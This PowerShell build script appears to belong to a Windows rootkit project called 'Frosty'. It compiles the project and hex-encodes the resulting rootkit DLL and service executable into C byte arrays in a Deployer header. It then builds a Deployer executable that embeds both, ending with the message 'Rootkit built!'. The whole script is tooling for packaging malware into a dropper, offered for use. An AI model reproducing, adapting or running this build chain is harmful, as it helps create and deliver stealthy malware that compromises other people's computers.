function Get-MSBuildPath {
    param (
        [string]$vswherePath = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    )

    if (Test-Path $vswherePath) {
        $vsInstallPath = & $vswherePath -latest -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe
        if ($vsInstallPath) {
            return $vsInstallPath[0]
        } else {
            Write-Host "MSBuild not found. Please ensure Visual Studio is installed with MSBuild components." -ForegroundColor Red
            exit 1
        }
    } else {
        Write-Host "vswhere utility not found. Please ensure Visual Studio 2017 or later is installed." -ForegroundColor Red
        exit 1
    }
}

$MSBUILD = $args[0]
if (-not $MSBUILD -or -not (Test-Path $MSBUILD)) {
    Write-Host "MSBuild path not provided or invalid. Attempting to locate MSBuild..." -ForegroundColor Yellow
    $MSBUILD = Get-MSBuildPath
}

function BuildProject {
    param (
        [string]$solutionPath,
        [string]$outputPath,
        [string[]]$msbFlags
    )

    Write-Host "[*] Building project: $solutionPath"
    & $MSBUILD $solutionPath $msbFlags
    if ($LASTEXITCODE -ne 0) { throw "Failed to build project $solutionPath" }
    Copy-Item $outputPath -Destination ".\build\" -Force
}

function ConvertToHex {
    param (
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) { throw "File $filePath not found" }

    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $fileHex = $fileContent | ForEach-Object { "0x{0:X2}" -f $_ }
    return $fileHex -join ', '
}

function WriteToRawFile {
    param (
        [string]$variableName,
        [string]$hexString
    )

    echo "unsigned char $variableName[] = { " >> Deployer/Deployer/Raw.h
    echo "$hexString" >> Deployer/Deployer/Raw.h
    echo "};" >> Deployer/Deployer/Raw.h
}

function InitializeBuildDirectory {
    Remove-Item -Path "build" -Recurse -Force | Out-Null
    New-Item -ItemType Directory -Path "build" | Out-Null
}

if (-not $args[1]) {
    Write-Host "[-] Add the architecture (x64/x86). Ex:"
    Write-Host ".\builder.ps1 <MSBuildPath> x64"
    exit
}

$platform = if ($args[1] -eq "x64") { "x64" } elseif ($args[1] -eq "x86") { "Win32" } else { throw "Invalid architecture" }
$MSB_FLAGS = @("/t:Rebuild", "/p:Configuration=Release", "/p:Platform=$platform")

InitializeBuildDirectory

try {
    BuildProject "Frosty.sln" ".\x64\Release\*.exe" $MSB_FLAGS
    $rkDllHex = ConvertToHex "$pwd\build\Dll.dll"
    $rkServiceHex = ConvertToHex "$pwd\build\Service.exe"

    WriteToRawFile "rkDll" $rkDllHex
    WriteToRawFile "rkService" $rkServiceHex

    Set-Location "Deployer"
    BuildProject "Deployer.sln" ".\x64\Release\Deployer.exe" $MSB_FLAGS
    Set-Location ".."

    Write-Host "[+] Rootkit built!"
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
